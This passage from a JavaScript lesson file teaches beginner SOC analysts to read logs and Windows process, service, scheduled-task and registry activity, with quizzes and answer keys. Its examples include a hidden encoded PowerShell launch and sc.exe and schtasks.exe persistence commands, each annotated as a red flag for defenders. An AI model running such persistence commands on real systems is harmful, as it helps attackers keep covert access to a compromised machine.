// Learning Path lessons — Foundations module B
const lessons = [
  {
    "id": "local-lesson-6",
    "slug": "what-a-log-is-and-how-to-read-one",
    "title": "What a Log Is, Where Logs Come From, and How to Read One",
    "topic": "Log Analysis",
    "difficulty": "beginner",
    "kind": "lesson",
    "intro": "Almost everything you will do as a SOC analyst starts with a log. An alert fires, and behind that alert are log lines. A manager asks \"did this user really log in from Brazil?\" and the answer lives in logs. A ransomware investigation, a phishing triage, a simple \"is this normal?\" question — all of them are answered by reading records that computers wrote about their own behavior. If you cannot open a log, find the important fields, and understand what the machine is telling you, then every other skill in security sits on top of nothing. This lesson builds that foundation from zero.\n\nThink of a log the way you think of a security camera in a store. The camera does not stop crime by itself. It quietly records what happened, frame by frame, so that later — when something goes wrong — someone can rewind and see who walked in, what they touched, and when they left. A log is the digital version of that footage, except instead of images it records structured facts: at this exact time, this user, on this computer, did this action, from this address. Systems write these records constantly, whether or not anyone is watching, which is exactly why they are so valuable after an incident.\n\nBy the end of this lesson you will be able to look at a log line you have never seen before and still answer the three questions that matter most: who did it, what did they do, and when. You will learn where logs come from and, just as important, what each source can and cannot see, so you know which log to reach for. You will learn the difference between a raw log and a parsed one, why SIEMs rewrite logs into tidy fields, and how to recognize common field names like source.ip, user.name, and event.action across different products. Most importantly, you will build the habit every strong analyst has: turning a single field into a question, and a question into an investigation.",
    "sections": [
      {
        "heading": "What a Log Line Actually Is",
        "content": "A log line is a record of one event. That is the whole idea. Something happened on a computer — a user signed in, a file was opened, a network connection was made, a program crashed — and the system wrote down a short note describing it. Stack thousands of those notes together in time order and you have a log: a diary the machine keeps about its own life.\n\nEvery useful log record answers at least three questions, and you should train your eye to hunt for them immediately. The first is **when** — the timestamp. The second is **who or what** — the source: which computer, which user, which service produced the event. The third is **what happened** — the action or event type. Everything else in the line is extra detail that supports those three anchors. If you can find when, who, and what, you can read almost any log, even one from a product you have never touched.\n\n### The security-camera analogy\n\nImagine reviewing store footage after a theft. You do not need to understand how the camera works internally. You just scrub the timeline to the moment of interest, see who was in frame, and watch what they did. A log works the same way. You do not need to know how the operating system generated the event; you need to find the right moment in time and read who was present and what they did. The camera does not judge — it records everything, the boring and the alarming alike. A log is the same: 99% of what it captures is completely normal, and your job is to find the 1% that is not.\n\n### Fields: the columns of the diary\n\nEach piece of information in a log line is a **field**. A field is just a labeled value: a name and the data that goes with it. \"user.name = jsmith\" is a field. \"source.ip = 10.4.2.19\" is a field. \"event.action = user_login\" is a field. When you read a log, you are really reading a collection of these name-and-value pairs describing a single moment. Some logs make the fields obvious with clear labels; others cram them into one long sentence you have to pick apart. Either way, the underlying idea never changes: a log line is a bundle of fields describing one event that happened at one time.\n\nThe reason logs matter so much in security is that attackers are also just \"doing things\" on computers, and those things get recorded like everything else. An attacker who steals a password still has to log in, and that login is a log line. Malware that phones home still opens a network connection, and that connection is a log line. The attacker cannot easily avoid leaving footage, which means the analyst who can read footage holds a real advantage. Your entire craft begins with respecting the humble log line as the atomic unit of truth about what happened.",
        "codeExample": "// One event, written as a single log line (a Windows sign-in, simplified)\n// Read it by hunting for WHEN, WHO, and WHAT first:\n2026-07-04T08:14:22Z host=FIN-WKS-07 user.name=jsmith event.action=user_login source.ip=10.4.2.19 result=success\n\n// WHEN  -> 2026-07-04T08:14:22Z   (the timestamp, in UTC — the trailing Z means Zulu/UTC)\n// WHO   -> user.name=jsmith on host=FIN-WKS-07 from source.ip=10.4.2.19\n// WHAT  -> event.action=user_login, result=success\n// Everything else is supporting detail. Those three anchors let you read almost any log."
      },
      {
        "heading": "Where Logs Come From",
        "content": "Logs do not come from one place. They come from every layer of the environment, and each layer sees the world from its own vantage point. A huge part of becoming a good analyst is knowing which log source can answer your question — because reaching for the wrong source wastes time and, worse, can make you believe something is safe when the source simply could not see the danger.\n\n### The five sources you will meet constantly\n\n**Endpoint / EDR.** The endpoint is the individual computer — a laptop, a workstation, a server. EDR (Endpoint Detection and Response) is security software that lives on that machine and watches what happens on it up close: which programs run, what files they touch, which processes spawn which other processes. This is your most detailed source. It can see a malicious program launch even if that program never touches the network. What it cannot see is anything happening on machines where it is not installed.\n\n**Network / Firewall.** The firewall and other network sensors sit between computers and watch traffic flow past. They see connections: this address talked to that address, on this port, moving this many bytes. This source is great for spotting a machine reaching out to a suspicious destination. But it usually cannot tell you which *user* or which *program* on the machine made the connection — it sees the envelope, not the person who wrote the letter.\n\n**Identity / Active Directory.** Identity systems (like Active Directory, the directory that manages Windows users and computers in most companies) record who authenticated, where, and whether it worked. This is the source for \"did this login really happen?\" and \"whose account was used?\" It sees accounts and authentication, but it does not see what a program did after the user logged in.\n\n**Cloud.** Cloud platforms (AWS, Azure, Microsoft 365, Google Cloud) keep their own audit logs of actions taken inside them: a file shared, a permission changed, an API called, a virtual machine created. As companies move to the cloud, these logs become essential, and they are often the *only* record of cloud activity — the firewall and EDR on-premises never saw it.\n\n**Application.** Individual applications — a web server, a database, a business app — write their own logs about their own behavior: pages requested, queries run, errors thrown. These are specialized but invaluable when the incident touches that specific application.\n\n### The habit: ask what each source can and cannot see\n\nThe analyst's discipline here is to always ask, \"What is this source blind to?\" EDR is blind to machines without the agent. Firewalls are blind to the user behind the connection. Identity logs are blind to post-login activity. No single source tells the whole story, which is why investigations pull from several. When you understand each source's field of view, you stop trusting a clean log from a source that was never in a position to see the problem — a mistake that has let real intrusions slide past inexperienced analysts.",
        "codeExample": "// The SAME laptop compromise, seen by three different sources.\n// Notice how each one sees a different slice — and misses the others' slice.\n\n// ENDPOINT / EDR  — sees the program and its parent, but not the wider network\nprocess.name=powershell.exe parent.process.name=winword.exe user.name=jsmith host=FIN-WKS-07\n\n// NETWORK / FIREWALL — sees the connection, but NOT which user or program made it\nsource.ip=10.4.2.19 destination.ip=185.99.4.12 destination.port=443 bytes_out=48211\n\n// IDENTITY / ACTIVE DIRECTORY — sees the login, but nothing about what ran afterward\nuser.name=jsmith event.action=logon logon.type=2 result=success host=FIN-WKS-07\n\n// Only by combining them do you get the full story: jsmith logged in, opened Word,\n// Word spawned PowerShell, and that host then reached an unfamiliar external IP."
      },
      {
        "heading": "Raw vs Parsed, Structured vs Unstructured",
        "content": "When a system first writes a log, it writes it in whatever format its designers chose. That original, untouched form is called the **raw log**. Raw logs are honest but messy: some are neat, some are a wall of text, and every product does it a little differently. Before that raw data becomes easy to search, something usually cleans it up — and understanding that journey keeps you from being confused when the same event looks different in two places.\n\n### Structured vs unstructured\n\nA **structured** log already separates its data into clear labeled fields. The most common structured format you will meet is **JSON**, which wraps each value in an obvious \"name\": value pair, like {\"user\":\"jsmith\",\"action\":\"login\"}. You can hand JSON to a computer and it knows exactly where the username is. Structured logs are a gift — the work of splitting the event into fields is already done.\n\nAn **unstructured** log is free-form text: a human-readable sentence with no clear boundaries between values. \"User jsmith logged in from 10.4.2.19 at 8:14\" is unstructured. A person can read it, but a computer has to be *taught* where the username ends and the address begins. Much of the older logging in the world is unstructured or semi-structured, which is why the next idea exists.\n\n### Key-value pairs and normalization\n\nBetween fully structured and fully unstructured sits the **key-value pair** style, which you saw in the earlier examples: user.name=jsmith source.ip=10.4.2.19. Each field is a key, an equals sign, and a value. It is not as rigid as JSON but far easier to read than a plain sentence, and it is extremely common.\n\nHere is the crucial part for a SOC analyst. Every product names its fields differently. One firewall calls the source address \"src\"; another calls it \"source_ip\"; a cloud log calls it \"callerIpAddress.\" If you had to remember every product's private vocabulary, investigating would be impossible. So a **SIEM** (Security Information and Event Management system — the central platform where all your logs are collected and searched) performs **normalization**, also called **parsing**: it takes each raw log, figures out what every value means, and rewrites it into one shared set of field names. After normalization, that firewall's \"src\" and the cloud's \"callerIpAddress\" both become the same field — often source.ip — so you can search across every source at once.\n\n### Why you still need the raw log\n\nParsed logs are easier, but never throw away your respect for the raw version. Parsing can go wrong — a field lands in the wrong place, or a value gets dropped. When something looks strange, a seasoned analyst pulls up the original raw log to confirm what the machine actually wrote before drawing conclusions. The parsed view is the convenient summary; the raw log is the ground truth. Knowing both, and knowing when to distrust the tidy version, is a mark of an analyst who has been burned once and learned. Always ask: is this field what the machine reported, or what the parser decided?",
        "codeExample": "// The SAME login event in three formats. Learn to recognize all three.\n\n// 1) UNSTRUCTURED (free text) — readable by a human, painful for a machine\nJul  4 08:14:22 FIN-WKS-07 User jsmith logged in from 10.4.2.19 (success)\n\n// 2) KEY-VALUE (semi-structured) — each field is key=value, easy to scan\ntime=2026-07-04T08:14:22Z host=FIN-WKS-07 user=jsmith src=10.4.2.19 outcome=success\n\n// 3) STRUCTURED (JSON) — fully labeled, ready for a computer to index\n{ \"@timestamp\": \"2026-07-04T08:14:22Z\", \"host\": \"FIN-WKS-07\",\n  \"user\": { \"name\": \"jsmith\" }, \"source\": { \"ip\": \"10.4.2.19\" },\n  \"event\": { \"action\": \"user_login\", \"outcome\": \"success\" } }\n\n// After the SIEM NORMALIZES all three, they share one vocabulary:\n// user.name=jsmith   source.ip=10.4.2.19   event.action=user_login   event.outcome=success"
      },
      {
        "heading": "How to Read an Unfamiliar Log",
        "content": "You will constantly face logs from products you have never used. The beginner panics; the trained analyst stays calm, because the method for reading a strange log is always the same. You are not memorizing every product — you are applying a repeatable process that works everywhere.\n\n### Step one: find the anchors\n\nStart exactly where you started in the first section: locate the timestamp (when), the source identity (who — a user, a host, an IP), and the action (what). These three appear in essentially every log, and finding them orients you instantly. Scan for anything that looks like a date or time. Scan for anything that looks like a username or a computer name or an IP address. Scan for a verb — login, create, delete, connect, block, allow. In under a minute you have the skeleton of the event even in a log you have never seen.\n\n### Step two: use field-name intuition\n\nMany modern logs, especially after a SIEM normalizes them, follow naming conventions that you can *predict* once you know the pattern. Fields are often grouped by a category prefix followed by a dot and a specific attribute. Learn these families and you can guess field meanings on sight:\n\n**source.*** and **destination.*** describe the two ends of a network connection: source.ip, source.port, destination.ip, destination.port. Source is where something came from; destination is where it went. **user.*** describes the human or account: user.name, user.domain, user.id. **host.*** or **device.*** describes the machine: host.name, host.os. **event.*** describes the action itself: event.action (the verb — what happened), event.outcome (success or failure), event.category (the general type). **process.*** describes a running program: process.name, process.pid (the process ID number), process.command_line (the exact command that was run).\n\nOnce these families live in your head, an unfamiliar log stops being intimidating. You see \"event.action\" and you know that is the verb. You see \"source.ip\" and you know where it came from. You do not need documentation for the common cases — you have intuition.\n\n### Step three: read the who / what / when as a sentence\n\nThe final move is to assemble the anchors into a plain-English sentence and say it out loud (or in your head): \"At 8:14 UTC, user jsmith on host FIN-WKS-07 successfully logged in from 10.4.2.19.\" If you can produce that sentence, you have read the log. Everything after that is deciding whether the sentence is *normal* or *worth worrying about* — which is the subject of the next section.\n\n### When a field is genuinely unknown\n\nSometimes a field truly is product-specific and you cannot guess it. That is fine. Note it, and if it seems relevant, look it up in the vendor's field reference rather than guessing — a wrong guess about a field's meaning is how analysts reach confident but false conclusions. The discipline is knowing the difference between a field you can safely infer and one you must verify. Guess the common families; verify the exotic ones. That balance is what lets you move fast without fooling yourself.",
        "codeExample": "// An UNFAMILIAR log line from a product you've never seen. Read it with the method.\ntimeGenerated=2026-07-04T09:02:41Z DeviceName=SALES-LT-14 InitiatingProcessFileName=mshta.exe \\\n  InitiatingProcessAccountName=akhan RemoteUrl=hxxp://cdn-updates[.]info/x.hta ActionType=NetworkConnection\n\n// STEP 1 - Anchors:\n//   WHEN -> timeGenerated=2026-07-04T09:02:41Z\n//   WHO  -> DeviceName=SALES-LT-14, InitiatingProcessAccountName=akhan\n//   WHAT -> ActionType=NetworkConnection, InitiatingProcessFileName=mshta.exe\n\n// STEP 2 - Field-name intuition (even with vendor-specific names):\n//   \"DeviceName\"          ~ host.name\n//   \"InitiatingProcess*\"  ~ process.* (the program that acted)\n//   \"RemoteUrl\"           ~ destination / url\n\n// STEP 3 - Say it as a sentence:\n//   \"At 09:02 UTC, on SALES-LT-14, account akhan's mshta.exe made a network\n//    connection to cdn-updates[.]info.\" -> You just read a log you'd never seen."
      },
      {
        "heading": "From Log to Question: Turning Fields Into Investigation Leads",
        "content": "Reading a log tells you what happened. Investigating means asking what it *means* — and that is where good analysts separate themselves. A field is not just data; it is a doorway. Every field raises a question, and following those questions is literally the job. This section teaches the mental move at the heart of the craft: **pivoting**.\n\n### What pivoting means\n\nTo pivot is to take one value from a log and use it to go find every other log that shares that value. You have a source.ip, so you pivot on it: show me *everything* that involved 10.4.2.19 in the last 24 hours. You have a user.name, so you pivot on it: show me every action jsmith took today. One field becomes a thread, and you pull the thread to unravel the whole story. Pivoting is how a single suspicious line grows into a full timeline of an incident.\n\n### The questions each field raises\n\nTrain yourself so that every field automatically triggers a question:\n\n**A timestamp** asks: is this a normal time for this activity? A login at 3:00 AM local time for someone who works 9-to-5 is a different story than one at noon. It also asks: what else happened right before and right after this moment?\n\n**A source.ip** asks: whose machine is this, and is it internal or external? Is this address one we recognize, or is it new? Has this address done anything else suspicious? What is its reputation on threat-intelligence sources?\n\n**A user.name** asks: is this user doing something consistent with their job? Should this account even be able to do this? Are they logged in from where they usually are? Is this account maybe compromised?\n\n**An event.action** asks: is this action normal for this user and this host? Did it succeed or fail — and if it failed many times then succeeded, is that a brute-force login? What action came next?\n\n**A process.name**, especially with process.command_line, asks: is it normal for this program to run here, and does the command line look legitimate or obfuscated? What program launched it (its parent)?\n\n### Chaining questions into an investigation\n\nThe magic happens when answers feed the next question. You start with an alert on host FIN-WKS-07. You pivot on the host and see user jsmith logged in at 8:14. You pivot on jsmith and notice a login from an unfamiliar IP an hour earlier. You pivot on that IP and find it is in another country. Now you ask: could jsmith really be in two places at once? That is \"impossible travel,\" and you found it by chaining pivots, each field handing you the next question. No single log line screamed \"attack\" — the story emerged from following the threads.\n\n### The habit that makes an analyst\n\nThe difference between someone who *reads* logs and someone who *investigates* them is this reflex: never let a field sit there as mere data. Always ask, \"What does this make me want to know next, and which log will answer it?\" Most fields will lead nowhere — the activity is benign, and that is the normal, healthy outcome of most investigations. But the reflex of questioning every field is exactly what surfaces the rare case that matters. Logs are the footage; pivoting is how you watch it with intent. Master this, and you have the core loop of every investigation you will ever run.",
        "codeExample": "// Start with ONE line, then pivot field-by-field into a full investigation.\n\n// The starting alert:\ntime=2026-07-04T08:14:22Z host=FIN-WKS-07 user.name=jsmith event.action=user_login \\\n  source.ip=10.4.2.19 result=success\n\n// PIVOT on user.name=jsmith -> \"show me every event from this account today\"\n//   -> finds an EARLIER login at 07:05 from source.ip=45.61.130.9 (result=success)\n\n// PIVOT on source.ip=45.61.130.9 -> \"whose address is this? where is it?\"\n//   -> external IP, geolocates to a country jsmith has never worked from\n\n// The question the fields forced you to ask:\n//   08:14 login is from internal 10.4.2.19 (the office)\n//   07:05 login is from external 45.61.130.9 (another country), 69 minutes earlier\n//   -> Could jsmith be in two places at once? This is \"impossible travel.\"\n//   No single line was alarming; chaining the pivots revealed the story."
      }
    ],
    "keyTakeaways": [
      "A log line is the record of one event; read any log by first locating the three anchors — when (timestamp), who (source identity), and what (action).",
      "Every log source has a limited field of view: EDR sees the program but not the wider network, the firewall sees the connection but not the user, identity logs see the login but not what ran afterward — always ask what a source is blind to.",
      "Logs come raw and then get normalized by a SIEM into shared field names (source.ip, user.name, event.action); the parsed view is convenient, but the raw log is the ground truth to check when something looks wrong.",
      "Field-name families like source.*, user.*, host.*, event.*, and process.* let you predict the meaning of fields in a product you have never used, so an unfamiliar log is never truly unreadable.",
      "Investigation is pivoting: take one field's value, find every other log that shares it, and let each answer raise the next question — chaining pivots is how isolated lines become a full incident timeline."
    ],
    "quiz": [
      {
        "question": "You are a SOC analyst handed a single log line from a firewall you have never worked with before. You want to read it as fast as possible. Which approach reflects the correct first move for reading any unfamiliar log?",
        "options": [
          {
            "label": "Open the vendor's documentation and memorize every field name before reading the line",
            "value": "a"
          },
          {
            "label": "Locate the three anchors first — the timestamp (when), the source identity (who), and the action (what) — then assemble them into a plain sentence",
            "value": "b"
          },
          {
            "label": "Ignore the line and wait for the SIEM to generate an alert about it",
            "value": "c"
          },
          {
            "label": "Assume the field named 'src' means the same thing it means in every other product without checking",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "Every log, regardless of product, answers when/who/what, so hunting those three anchors first orients you instantly and lets you read a strange log in under a minute. Option a is impractical and unnecessary for the common cases where field-name intuition suffices. Option c abdicates the analyst's job — reading the raw evidence. Option d is dangerous overconfidence; genuinely exotic fields should be verified, not guessed, even though common families can be safely inferred."
      },
      {
        "question": "You are a SOC analyst investigating whether a laptop reached out to a malicious external server. The firewall log clearly shows the laptop's IP connecting to a suspicious destination, but your manager asks which user and which program on the laptop made the connection. Why can the firewall log alone not answer that?",
        "options": [
          {
            "label": "Firewall logs are always unstructured, so the fields cannot be parsed",
            "value": "a"
          },
          {
            "label": "The firewall sees the connection between addresses but generally cannot see which user or program on the host initiated it — that vantage point belongs to the endpoint/EDR source",
            "value": "b"
          },
          {
            "label": "Firewalls only record failed connections, never successful ones",
            "value": "c"
          },
          {
            "label": "The firewall log must have been corrupted during normalization",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "Each log source has a limited field of view; the firewall sees the network envelope (which IP talked to which IP) but not the user or process behind it, which is exactly what endpoint/EDR telemetry provides. Option a is false — firewall logs are frequently structured or key-value, and format is unrelated to the visibility gap. Option c is false; firewalls log allowed and blocked traffic. Option d invents a corruption that is not the cause; the limitation is inherent to what a network sensor can observe."
      },
      {
        "question": "You are a SOC analyst and the same login event appears one way in the raw log a server wrote and slightly differently in your SIEM's normalized view. Which statement best captures how you should treat these two versions?",
        "options": [
          {
            "label": "The normalized SIEM view is always perfect, so the raw log can be safely deleted",
            "value": "a"
          },
          {
            "label": "The raw log is the ground truth the machine actually wrote; normalization is a convenient shared-vocabulary summary that can occasionally misplace or drop a field, so verify against the raw log when something looks wrong",
            "value": "b"
          },
          {
            "label": "The raw log and the normalized log are unrelated records of different events",
            "value": "c"
          },
          {
            "label": "You should only ever trust unstructured logs and ignore anything in JSON",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "Normalization rewrites each product's private field names into one shared vocabulary so you can search across sources, but parsing can occasionally go wrong, so the raw log remains the authoritative record to confirm against. Option a is unsafe — the raw log is precisely what you fall back on when the parsed view looks off. Option c is wrong; the normalized log is derived from the same raw event. Option d misunderstands formats entirely; JSON is a structured, trustworthy form and unstructured text is actually the harder one for machines."
      },
      {
        "question": "You are a SOC analyst who notices user jsmith logged in from the office IP at 08:14, and after pivoting on the account you find an earlier successful login at 07:05 from an external IP that geolocates to another country. What investigative concept does chaining these pivots reveal, and why is pivoting the right technique here?",
        "options": [
          {
            "label": "It reveals nothing useful, because a single login line is never worth investigating",
            "value": "a"
          },
          {
            "label": "It reveals 'impossible travel' — the same account authenticating from two distant locations in a short window — found by pivoting on the user.name to gather all their activity and then pivoting on the new IP to locate it",
            "value": "b"
          },
          {
            "label": "It reveals a brute-force attack, identifiable purely from the two successful logins",
            "value": "c"
          },
          {
            "label": "It proves the account is safe, because both logins succeeded",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "Pivoting takes one field's value and pulls every log that shares it; pivoting on user.name surfaced the earlier login, and pivoting on that login's IP revealed a distant location, exposing impossible travel — two logins too far apart to be the same person. Option a is wrong because chaining pivots is exactly how one line becomes a timeline. Option c misnames the pattern; brute force is many failed attempts before a success, not two successes from different places. Option d confuses 'succeeded' with 'legitimate' — a successful login from an impossible location is a strong compromise signal, not reassurance."
      }
    ],
    "references": [
      "https://www.elastic.co/guide/en/ecs/current/ecs-field-reference.html",
      "https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/basic-security-audit-policies",
      "https://csrc.nist.gov/pubs/sp/800/92/final",
      "https://attack.mitre.org/datasources/",
      "https://docs.zeek.org/en/master/logs/index.html"
    ],
    "xp": 160,
    "estimatedMinutes": 32,
    "createdAt": "2026-07-04T00:00:00.000Z",
    "researchUsed": false
  },
  {
    "id": "local-lesson-7",
    "slug": "windows-internals-for-soc-analysts",
    "title": "The Windows You'll Investigate: Processes, Services, the Registry, and Accounts",
    "topic": "Windows Fundamentals",
    "difficulty": "beginner",
    "kind": "lesson",
    "intro": "Most of the computers you will defend as a SOC analyst run Windows. Attackers know this too, which is why the overwhelming majority of intrusions you investigate will involve Windows machines. If you do not understand how Windows actually works — how it runs programs, how it starts things automatically, how it remembers settings, and how it decides who is allowed to do what — then every alert about a Windows host will feel like a foreign language. This lesson teaches you the operating-system concepts underneath the alerts, so that when a detection fires you understand the machinery it is describing.\n\nA quick but important note: this lesson is about Windows *concepts*, not about Windows Event IDs. You may have heard that Event ID 4624 means a login or 4688 means a process started. Those numbered event codes are the subject of a separate lesson on the Event Log. Here we go one level deeper — to the actual things those events describe. What *is* a process? What *is* a service? What *is* the registry? Once you understand the concepts, the event codes later will just be labels for machinery you already know.\n\nThink of Windows like a large office building. Programs running are like employees moving around and doing tasks. Services and scheduled tasks are like the automated systems — the lights that switch on at dawn, the sprinklers on a timer — that run without anyone pressing a button. The registry is the building's master control panel and address book, storing thousands of settings including which automated systems start up. And accounts with their privileges are the badge system that decides who can open which doors. An attacker who breaks in wants to blend in with the employees, hijack an automated system so they keep getting back in, and quietly upgrade their badge to open more doors. By the end of this lesson you will understand each of these pieces well enough to spot when something is wrong — and, just as importantly, you will know the questions a good analyst asks about each one.",
    "sections": [
      {
        "heading": "Processes and the Parent-Child Tree",
        "content": "A **process** is a program while it is running. The program file sitting on disk — say chrome.exe — is just a file. The moment you launch it, Windows loads it into memory and gives it life; that running instance is a process. Everything a computer *does* is done by processes. When you investigate a Windows host, you are largely investigating processes: which ones are running, what they are doing, and whether they belong there.\n\n### PID and parent PID\n\nEvery process gets a unique number called a **PID** (Process ID) so the system can tell them apart, since you might have several copies of the same program running. More important for an analyst is the **parent PID (PPID)**: the ID of the process that *launched* this one. Processes are not born from nothing — one process starts another. When you double-click an app, the Windows shell process starts it, so the shell is the parent and your app is the child. This parent-child relationship is recorded, and it is one of the most powerful pieces of information you have.\n\n### Why the parent-child chain is the analyst's best friend\n\nBecause processes track their parent, you can reconstruct a family tree of what launched what. This tree is where malicious behavior hides in plain sight. Individually, many programs are perfectly normal. What betrays an attack is the *relationship* between them — a child process that has no business being spawned by that parent.\n\nThe classic example: **winword.exe spawning powershell.exe**. Microsoft Word is a document editor. PowerShell is a powerful scripting and automation tool. In normal life, Word does not launch PowerShell — there is no legitimate reason for a document to start a scripting engine. But this exact chain is one of the most common signatures of a malicious document (a \"maldoc\"): the victim opens a booby-trapped Word file, hidden code inside it launches PowerShell, and PowerShell downloads the real malware. The individual pieces look ordinary; the *parent-child link* is the tell.\n\n### The questions a good analyst asks\n\nWhen you see a process, do not evaluate it alone — evaluate it in its family. Ask: **What is this process's parent, and does that pairing make sense?** Should Word really be launching a script engine? Should a web browser be spawning a command shell? Ask: **What did this process launch in turn** — its children? A suspicious process often has an equally suspicious child. Ask: **What is the full command line** that started it? The command line frequently reveals intent — a download instruction, an encoded blob of text, a connection to an external address — that the program name alone hides.\n\nLearning to read process trees is the single most transferable Windows skill in the SOC. Alerts come and go, tools change, but the question \"what launched this, and does that make sense?\" pays off in nearly every Windows investigation you will ever run. When in doubt, walk the tree upward to the root and downward to the leaves, and narrate it as a story: this launched that, which launched that. If the story does not make sense, you have found something.",
        "codeExample": "// A Sysmon Event ID 1 (process create) showing a SUSPICIOUS parent chain.\n// (Sysmon is a free Microsoft tool that records detailed process activity.)\nEvent ID: 1 (ProcessCreate)\nUtcTime:            2026-07-04 09:41:18.220\nImage:             C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nProcessId:         7328        // this process's PID\nParentImage:       C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nParentProcessId:   5104        // the PARENT's PID -> Word launched PowerShell\nUser:              CORP\\jsmith\nCommandLine:       powershell.exe -nop -w hidden -enc SQBFAFgAKAB...  // encoded = red flag\n\n// The story: WINWORD.EXE (parent) -> powershell.exe (child), running a HIDDEN,\n// ENCODED command. Word has no business starting PowerShell. The parent-child\n// pairing, not either program alone, is what reveals the malicious document."
      },
      {
        "heading": "Services, Scheduled Tasks, and How Windows Starts Programs",
        "content": "Not everything on a computer is started by a person clicking something. A great deal runs automatically, in the background, without anyone present. Windows has several mechanisms for this, and attackers love every one of them — because a program that starts automatically is a program that keeps coming back even after the machine reboots. That property is called **persistence**, and it is one of an attacker's top goals.\n\n### Services\n\nA **service** is a program designed to run in the background, usually starting when Windows boots and continuing without a logged-in user. Your antivirus is a service. The Windows Update mechanism is a service. Print spooling is a service. Services are managed by a part of Windows that starts them, stops them, and restarts them if they crash. Because services start automatically and run with high privilege, they are prime real estate for attackers. If an attacker can install their malware *as a service*, it launches every time the machine boots, quietly and reliably. Tools like PsExec (a legitimate admin tool that attackers also abuse) work by creating a service on a remote machine to run a command.\n\n### Scheduled tasks\n\nA **scheduled task** runs a program on a trigger: at a specific time, at every login, when the system is idle, or on a repeating interval. It is Windows' built-in \"do this later, or do this on a schedule\" system. Legitimate examples are everywhere — a backup that runs nightly, an update check every few hours. But the same mechanism is a favorite for persistence: an attacker creates a scheduled task that re-launches their malware every hour or at every user logon. Even if you kill the running malware, the task faithfully starts it again. The command-line tool schtasks.exe and the graphical Task Scheduler both create these, and their creation is something worth watching closely.\n\n### Autostart in general\n\nBeyond services and scheduled tasks, Windows has many **autostart** locations — places from which programs launch automatically. Startup folders, registry Run keys (the subject of the next section), logon scripts, and more. Collectively these are called **ASEPs** (AutoStart Extensibility Points). Security professionals sometimes call the whole collection \"autoruns,\" after a famous tool that lists them all.\n\n### The questions a good analyst asks\n\nWhen a new service or scheduled task appears, ask: **Who or what created this, and when?** A service created moments after a suspicious process ran is a strong sign the attacker just installed persistence. Ask: **What does it actually launch?** Legitimate services point to well-known program files in expected locations; malicious ones often point to strange paths (a user's temp folder, a random filename) or run an encoded command. Ask: **Does this belong on this machine?** A scheduled task named to look boring (\"SystemUpdateCheck\") but pointing to a script in a user's download folder is lying about what it is. The instinct to check *what starts automatically* on a suspect host — and whether any of it is new or out of place — catches a large fraction of real persistence.",
        "codeExample": "// A newly created SERVICE and a SCHEDULED TASK used for persistence.\n\n// 1) A service whose binary points to a suspicious path (note the user temp folder)\nsc.exe create \"WinDefendUpd\" binPath= \"C:\\Users\\jsmith\\AppData\\Local\\Temp\\svc32.exe\" start= auto\n// Red flags: benign-sounding name, but the binary lives in a TEMP folder and auto-starts.\n\n// 2) A scheduled task that re-launches malware at every logon\nschtasks.exe /create /tn \"SystemUpdateCheck\" /tr \"powershell -w hidden -f C:\\Users\\jsmith\\Downloads\\u.ps1\" \\\n  /sc onlogon /rl highest\n// Red flags: boring name (\"SystemUpdateCheck\") hiding a hidden PowerShell script\n//            from a Downloads folder, running at every logon with highest privilege.\n\n// Analyst questions: Who created it, and when? What does it launch, and from where?\n// Does a service/task with THIS name and THIS path belong on THIS machine?"
      },
      {
        "heading": "The Registry and Autoruns",
        "content": "The **registry** is Windows' giant central database of settings. Almost every configuration choice on the machine — how the desktop looks, which file types open in which programs, network settings, security policies, and crucially *which programs start automatically* — is stored in the registry. Think of it as the building's master control panel: thousands of switches and address labels, all in one place. Understanding the registry matters because it is both where Windows keeps its important settings and where attackers reach in to flip switches in their favor.\n\n### How the registry is organized\n\nThe registry is arranged like a filing system of folders and values. The top-level folders are called **hives**, and the two you will meet most are **HKLM** (HKEY_LOCAL_MACHINE), which holds settings for the whole computer, and **HKCU** (HKEY_CURRENT_USER), which holds settings for the currently logged-in user. Inside a hive are **keys** (like folders) and **values** (the actual settings, each a name and its data). A registry path reads like a folder path — for example, HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run. You do not need to memorize the tree; you need to recognize when a path is one attackers abuse.\n\n### Run keys and persistence\n\nThe single most famous registry location for attackers is the **Run key**. Any program listed under a Run key launches automatically every time the user logs in — no service, no scheduled task required, just an entry in the master control panel. The two classic paths are HKCU\\...\\CurrentVersion\\Run (runs when *this user* logs in) and HKLM\\...\\CurrentVersion\\Run (runs for *any* user). This is persistence in its simplest form: an attacker adds one value pointing to their malware, and Windows itself relaunches it at every logon, forever, until someone removes the entry.\n\nThere are many cousins of the Run key — RunOnce, Winlogon keys, image-hijack keys, and others — but the concept is identical: a registry entry that causes something to start automatically. This is why the registry sits at the center of persistence hunting.\n\n### Autoruns: listing everything that starts\n\nBecause programs can auto-start from so many registry locations, plus folders and services and tasks, checking each by hand is impractical. Microsoft's Sysinternals **Autoruns** tool exists precisely to enumerate *every* autostart point on a machine in one view — every Run key, every service, every scheduled task, every logon hook. Learning to read an Autoruns output, or the equivalent EDR telemetry, is a core persistence-hunting skill.\n\n### The questions a good analyst asks\n\nWhen you see a registry change, especially to a Run key, ask: **What program does this entry launch, and is it signed and in a normal location?** A Run value pointing to a Microsoft-signed program in Program Files is likely fine; one pointing to an unsigned executable in a temp or AppData folder is highly suspicious. Ask: **When was this value written, and what process wrote it?** A Run-key write immediately following a malicious PowerShell command is persistence being installed before your eyes. Ask: **Is this a known-good autostart, or something new to this machine?** The reflex to check the Run keys and other autostart points — and to be suspicious of anything new pointing to an odd path — is one of the highest-value habits in Windows defense.",
